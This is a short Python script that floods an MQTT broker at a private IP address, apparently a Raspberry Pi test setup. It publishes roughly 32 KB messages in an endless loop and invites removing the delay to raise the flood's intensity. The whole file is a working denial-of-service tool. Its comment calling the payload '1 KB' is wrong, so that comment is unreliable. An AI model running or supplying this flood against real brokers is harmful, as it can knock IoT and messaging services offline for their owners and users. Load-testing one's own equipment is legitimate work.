import paho.mqtt.client as mqtt
import time

broker_ip = "172.20.10.7"  # Replace with broker Pi's IP
topic = "test/flood"

client = mqtt.Client()
client.connect(broker_ip, 1883, 60)

print("Starting MQTT flood...")

while True:
    payload = "X" * 32368  # Sending 1 KB message
    client.publish(topic, payload)
    print("Sent message of size:", len(payload))
    # Remove or adjust sleep time to control flooding intensity
    time.sleep(0.01)  # Adjust for different levels of load 
